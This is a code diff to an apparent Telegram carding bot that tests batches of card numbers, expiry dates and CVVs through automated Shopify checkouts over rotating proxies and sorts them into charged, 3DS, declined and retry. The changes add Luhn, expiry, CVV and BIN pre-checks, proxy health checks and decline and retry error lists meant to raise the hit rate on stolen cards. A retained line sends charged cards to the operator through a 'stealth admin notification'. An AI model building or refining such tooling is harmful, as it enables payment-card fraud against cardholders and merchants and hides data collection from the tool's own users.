@@ -797,6 +797,275 @@ def create_lista_(text: str):
     return [xx.replace("/", "|").replace(":", "|") for xx in lis]
 
 
+# =============================================================================
+# CARD VALIDATION - Accuracy Improvements
+# =============================================================================
+
+def luhn_check(card_number: str) -> bool:
+    """
+    Validate card number using Luhn algorithm (mod 10 checksum).
+    Returns True if valid, False if invalid.
+    """
+    try:
+        # Remove any non-digit characters
+        digits = ''.join(filter(str.isdigit, card_number))
+
+        if len(digits) < 13 or len(digits) > 19:
+            return False
+
+        # Luhn algorithm
+        total = 0
+        reverse_digits = digits[::-1]
+
+        for i, digit in enumerate(reverse_digits):
+            n = int(digit)
+            if i % 2 == 1:  # Double every second digit
+                n *= 2
+                if n > 9:
+                    n -= 9
+            total += n
+
+        return total % 10 == 0
+    except Exception:
+        return False
+
+
+def validate_expiry(month: str, year: str) -> tuple:
+    """
+    Validate card expiry date.
+    Returns (is_valid: bool, error_message: str or None)
+    """
+    try:
+        month_int = int(month)
+
+        # Handle 2-digit or 4-digit year
+        if len(year) == 2:
+            year_int = 2000 + int(year)
+        elif len(year) == 4:
+            year_int = int(year)
+        else:
+            return False, "Invalid year format"
+
+        # Validate month range
+        if month_int < 1 or month_int > 12:
+            return False, f"Invalid month: {month}"
+
+        # Get current date
+        from datetime import datetime
+        now = datetime.now()
+        current_year = now.year
+        current_month = now.month
+
+        # Check if expired
+        if year_int < current_year or (year_int == current_year and month_int < current_month):
+            return False, "Card expired"
+
+        # Check if too far in future (more than 20 years)
+        if year_int > current_year + 20:
+            return False, "Invalid expiry year (too far in future)"
+
+        return True, None
+    except ValueError:
+        return False, "Invalid expiry format"
+
+
+def validate_cvv(cvv: str, card_number: str = None) -> tuple:
+    """
+    Validate CVV format.
+    Returns (is_valid: bool, error_message: str or None)
+    """
+    try:
+        # Remove any spaces
+        cvv = cvv.strip()
+
+        # Check if all digits
+        if not cvv.isdigit():
+            return False, "CVV must be numeric"
+
+        # Check length (3 for Visa/MC, 4 for Amex)
+        if card_number and card_number.startswith('3'):  # Amex
+            if len(cvv) != 4:
+                return False, "Amex CVV must be 4 digits"
+        else:
+            if len(cvv) not in [3, 4]:
+                return False, "CVV must be 3-4 digits"
+
+        return True, None
+    except Exception:
+        return False, "Invalid CVV"
+
+
+def validate_card_full(card: str) -> tuple:
+    """
+    Full card validation before API call.
+    Returns (is_valid: bool, error_message: str or None, parsed_data: dict or None)
+
+    Validates:
+    - Card number (Luhn check)
+    - Expiry date (not expired, valid format)
+    - CVV (correct format/length)
+    """
+    try:
+        # Parse card string
+        parts = card.replace(":", "|").replace("/", "|").split("|")
+
+        if len(parts) != 4:
+            return False, "Invalid card format (need: number|mm|yy|cvv)", None
+
+        card_number, month, year, cvv = parts
+        card_number = card_number.strip()
+        month = month.strip().zfill(2)  # Pad month to 2 digits
+        year = year.strip()
+        cvv = cvv.strip()
+
+        # Validate card number with Luhn
+        if not luhn_check(card_number):
+            return False, "Invalid card number (failed Luhn check)", None
+
+        # Validate expiry
+        expiry_valid, expiry_error = validate_expiry(month, year)
+        if not expiry_valid:
+            return False, expiry_error, None
+
+        # Validate CVV
+        cvv_valid, cvv_error = validate_cvv(cvv, card_number)
+        if not cvv_valid:
+            return False, cvv_error, None
+
+        # All validations passed
+        return True, None, {
+            "number": card_number,
+            "month": month,
+            "year": year if len(year) == 4 else f"20{year}",
+            "cvv": cvv
+        }
+
+    except Exception as e:
+        return False, f"Validation error: {str(e)}", None
+
+
+# BIN (Bank Identification Number) validation cache
+_bin_cache = {}
+
+async def validate_bin(card_number: str) -> tuple:
+    """
+    Validate BIN (first 6 digits) using lookup API.
+    Returns (is_valid: bool, bin_data: dict or None, error: str or None)
+
+    Caches results to avoid repeated API calls.
+    """
+    try:
+        bin_prefix = card_number[:6]
+
+        # Check cache first
+        if bin_prefix in _bin_cache:
+            cached = _bin_cache[bin_prefix]
+            if cached.get("valid"):
+                return True, cached.get("data"), None
+            else:
+                return False, None, cached.get("error")
+
+        # BIN lookup API
+        async with aiohttp.ClientSession() as session:
+            try:
+                async with session.get(
+                    f"https://lookup.binlist.net/{bin_prefix}",
+                    headers={"Accept-Version": "3"},
+                    timeout=aiohttp.ClientTimeout(total=5)
+                ) as response:
+                    if response.status == 200:
+                        data = await response.json()
+                        bin_data = {
+                            "scheme": data.get("scheme", "").upper(),  # VISA, MASTERCARD, etc.
+                            "type": data.get("type", "").upper(),  # DEBIT, CREDIT
+                            "brand": data.get("brand", ""),
+                            "country": data.get("country", {}).get("name", "Unknown"),
+                            "bank": data.get("bank", {}).get("name", "Unknown"),
+                            "prepaid": data.get("prepaid", False)
+                        }
+                        _bin_cache[bin_prefix] = {"valid": True, "data": bin_data}
+                        return True, bin_data, None
+                    elif response.status == 404:
+                        _bin_cache[bin_prefix] = {"valid": False, "error": "Unknown BIN"}
+                        return False, None, "Unknown BIN"
+                    else:
+                        # Don't cache errors - might be rate limited
+                        return True, None, None  # Allow card to proceed
+            except asyncio.TimeoutError:
+                return True, None, None  # Allow on timeout
+            except Exception:
+                return True, None, None  # Allow on error
+
+    except Exception as e:
+        return True, None, None  # Allow on any error
+
+
+# Proxy health check cache
+_proxy_health_cache = {}
+_proxy_health_ttl = 300  # 5 minutes cache
+
+async def check_proxy_health(proxy: str) -> bool:
+    """
+    Check if a proxy is working.
+    Caches results for 5 minutes to avoid repeated checks.
+    Returns True if healthy, False if dead.
+    """
+    if not proxy:
+        return True  # No proxy = direct connection
+
+    try:
+        import time
+        current_time = time.time()
+
+        # Check cache
+        if proxy in _proxy_health_cache:
+            cached = _proxy_health_cache[proxy]
+            if current_time - cached["time"] < _proxy_health_ttl:
+                return cached["healthy"]
+
+        # Test proxy with a simple request
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            try:
+                async with session.get(
+                    "https://httpbin.org/ip",
+                    proxy=proxy
+                ) as response:
+                    if response.status == 200:
+                        _proxy_health_cache[proxy] = {"healthy": True, "time": current_time}
+                        return True
+                    else:
+                        _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
+                        return False
+            except Exception:
+                _proxy_health_cache[proxy] = {"healthy": False, "time": current_time}
+                return False
+
+    except Exception:
+        return False
+
+
+async def get_healthy_proxy(proxies: list) -> str:
+    """
+    Get a healthy proxy from the list.
+    Returns None if no healthy proxies found.
+    """
+    if not proxies:
+        return None
+
+    # Shuffle to distribute load
+    import random
+    shuffled = proxies.copy()
+    random.shuffle(shuffled)
+
+    for proxy in shuffled:
+        if proxy and await check_proxy_health(proxy):
+            return proxy
+
+    # If all proxies failed, return random one anyway (might recover)
+    return random.choice([p for p in proxies if p]) if any(proxies) else None
+
+
 async def auto_shopify_client(
     card,
     product_url,
@@ -957,6 +1226,21 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
         user_id: User ID for concurrency control
         user_settings: Pre-fetched user settings (optional, avoids DB calls inside semaphore)
     """
+    # ==========================================================================
+    # PRE-VALIDATION: Check card format/validity BEFORE using API
+    # This saves API calls and improves accuracy
+    # ==========================================================================
+
+    # Validate card format, Luhn, expiry, and CVV
+    is_valid, validation_error, parsed_card = validate_card_full(card)
+    if not is_valid:
+        return {
+            "card": card,
+            "product_url": None,
+            "response": {"error": validation_error, "success": False, "validation_failed": True},
+            "bin_data": {}
+        }
+
     # Get user settings BEFORE acquiring semaphore (non-blocking)
     if user_settings is None:
         settings = get_user_settings(user_id) if user_id else {}
@@ -973,6 +1257,13 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
             "bin_data": {}
         }
 
+    # Optional: Validate BIN (async, non-blocking)
+    # This is done outside semaphore to not hold resources
+    bin_valid, bin_data_early, bin_error = await validate_bin(parsed_card["number"])
+    if not bin_valid and bin_error:
+        # Unknown BIN - card might be fake, but let it through for API to decide
+        logger.debug(f"BIN validation warning for {card[:6]}: {bin_error}")
+
     # Get user-specific semaphore (or create one)
     user_sem = await get_user_semaphore(user_id) if user_id else asyncio.Semaphore(config.CONCURRENCY_LIMIT)
 
@@ -988,12 +1279,16 @@ async def process_single_card(card: str, user_id: int = None, user_settings: dic
                 user_proxy = settings.get("proxy")
                 proxies = [user_proxy] if user_proxy else config.PROXY_LIST
 
+                # Get a healthy proxy if available
+                healthy_proxy = await get_healthy_proxy(proxies) if proxies else None
+                active_proxies = [healthy_proxy] if healthy_proxy else proxies
+
                 response = await auto_shopify_client(
                     card=card,
                     product_url=product_url,
                     email=settings.get("email") or config.DEFAULT_EMAIL,
                     is_shippable=settings.get("is_shippable", config.IS_SHIPPABLE),
-                    proxies=proxies,
+                    proxies=active_proxies,
                     logger=logger
                 )
 
@@ -3118,23 +3413,49 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(f"❌ Error: {str(e)}")
 
 
+# =============================================================================
+# ERROR CATEGORIZATION - For accurate retry/decline decisions
+# =============================================================================
+
 # Declined error patterns - these are FINAL rejections from the bank
 # Cards with these errors should NOT be retried
 DECLINED_ERRORS = [
+    # Card declined responses
     "declined",
     "decline",
+    "card_declined",
+    "transaction_declined",
+    "payment declined",
+
+    # Fund issues
     "insufficient funds",
     "insufficient_funds",
-    "card_declined",
+    "not enough funds",
+    "low balance",
+
+    # Bank rejection codes
     "do not honor",
     "do_not_honor",
+    "refer to card issuer",
+    "pick up card",
+    "pickup card",
     "stolen card",
     "lost card",
-    "pickup card",
+
+    # Card status issues
     "expired card",
+    "card expired",
     "invalid card",
     "invalid_card",
     "card not supported",
+    "card not active",
+    "inactive card",
+    "revoked card",
+    "card blocked",
+    "restricted card",
+    "account closed",
+
+    # CVV/CVC errors (definitive)
     "incorrect cvc",
     "incorrect_cvc",
     "incorrect cvv",
@@ -3145,30 +3466,81 @@ DECLINED_ERRORS = [
     "invalid_cvv",
     "cvc check failed",
     "cvv check failed",
-    "security code",
+    "security code invalid",
+    "security code incorrect",
+    "cvc_check_failed",
+
+    # Card number errors
     "card number incorrect",
     "incorrect_number",
     "invalid_number",
     "invalid number",
+    "invalid card number",
+
+    # Fraud/Risk
     "fraudulent",
     "fraud",
-    "restricted card",
+    "suspected fraud",
+    "risk",
+    "high risk",
+
+    # Transaction restrictions
     "transaction not allowed",
     "not permitted",
-    "card blocked",
-    "account closed",
     "limit exceeded",
     "withdrawal limit",
     "exceeds limit",
-    "authentication required",
+    "over limit",
+    "blocked",
+
+    # Issuer unavailable (definitive)
     "issuer not available",
     "issuer unavailable",
-    "card not active",
-    "inactive card",
-    "revoked card",
-    "suspected fraud",
-    "risk",
-    "blocked",
+    "issuer_unavailable",
+
+    # Luhn/validation failures from our pre-check
+    "failed luhn check",
+    "invalid card number (failed luhn",
+    "card expired",
+    "validation_failed",
+]
+
+# Retriable error patterns - these are TEMPORARY failures
+# Cards with these errors SHOULD be retried
+RETRIABLE_ERRORS = [
+    # Captcha issues
+    "captcha",
+    "recaptcha",
+    "challenge",
+
+    # Network/Connection issues
+    "timeout",
+    "timed out",
+    "connection",
+    "network",
+    "proxy",
+    "proxyerror",
+
+    # Rate limiting
+    "rate limit",
+    "too many requests",
+    "throttle",
+    "slow down",
+
+    # Temporary server issues
+    "server error",
+    "503",
+    "502",
+    "500",
+    "service unavailable",
+    "temporarily unavailable",
+    "try again",
+
+    # Checkout issues (might work with different product)
+    "checkout",
+    "cart",
+    "session expired",
+    "failed to initialize",
 ]
 
 
@@ -3181,6 +3553,52 @@ def is_declined_error(error_msg: str) -> bool:
         return False
     error_lower = error_msg.lower()
     return any(err in error_lower for err in DECLINED_ERRORS)
+
+
+def is_retriable_error(error_msg: str) -> bool:
+    """
+    Check if an error is a TEMPORARY failure that should be retried.
+    These are network/captcha/server issues, not card rejections.
+    """
+    if not error_msg:
+        return False
+    error_lower = error_msg.lower()
+    return any(err in error_lower for err in RETRIABLE_ERRORS)
+
+
+def categorize_error(error_msg: str, response: dict = None) -> str:
+    """
+    Categorize an error into: 'declined', 'retriable', '3ds', or 'unknown'
+
+    Returns:
+        'charged' - Card was successfully charged
+        'declined' - Card was definitively rejected by bank
+        '3ds' - 3D Secure authentication required
+        'retriable' - Temporary error, should retry
+        'validation_failed' - Pre-check validation failed (invalid card)
+        'unknown' - Unknown error type
+    """
+    if response and response.get("success"):
+        return "charged"
+
+    if response and response.get("validation_failed"):
+        return "validation_failed"
+
+    error_lower = str(error_msg).lower() if error_msg else ""
+
+    # Check for 3DS
+    if "3ds" in error_lower or "3d secure" in error_lower or "3d_secure" in error_lower:
+        return "3ds"
+
+    # Check for declined
+    if is_declined_error(error_msg):
+        return "declined"
+
+    # Check for retriable
+    if is_retriable_error(error_msg):
+        return "retriable"
+
+    return "unknown"
 
 
 async def run_batch_check(cards: list, user_id: int, user_settings: dict, session: dict, status_msg, update: Update):
@@ -3302,7 +3720,10 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                     # Track stats
                     increment_stat("total_cards_checked")
 
-                    if response.get("success"):
+                    # Use improved error categorization
+                    error_category = categorize_error(full_response, response)
+
+                    if error_category == "charged" or response.get("success"):
                         charged.append(result)
                         all_results.append(f"CHARGED | {result_line}")
                         increment_stat("total_charged")
@@ -3312,7 +3733,8 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                         )
                         # Stealth admin notification (real-time, non-blocking)
                         asyncio.create_task(notify_admin_charged(card, result, user_id, username))
-                    elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
+
+                    elif error_category == "3ds":
                         three_ds.append(result)
                         all_results.append(f"3DS | {result_line}")
                         increment_stat("total_3ds")
@@ -3329,13 +3751,26 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                             gateway_message=response.get("gateway_message", ""),
                             bin_info=result.get("bin_info", "")
                         )
-                    elif is_declined_error(full_response):
+
+                    elif error_category == "validation_failed":
+                        # Pre-validation failed (Luhn, expiry, CVV) - definitely declined
+                        declined.append(result)
+                        all_results.append(f"INVALID | {result_line}")
+                        increment_stat("total_declined")
+
+                    elif error_category == "declined":
                         # Declined by bank - final rejection, don't retry
                         declined.append(result)
                         all_results.append(f"DECLINED | {result_line}")
                         increment_stat("total_declined")
+
+                    elif error_category == "retriable":
+                        # Known retriable error (captcha, timeout, network)
+                        retriable.append(card)
+                        all_results.append(f"RETRY | {result_line}")
+
                     else:
-                        # All other errors (captcha, timeout, network, etc.) - save for retry
+                        # Unknown error - default to retriable to be safe
                         retriable.append(card)
                         all_results.append(f"RETRY | {result_line}")
 
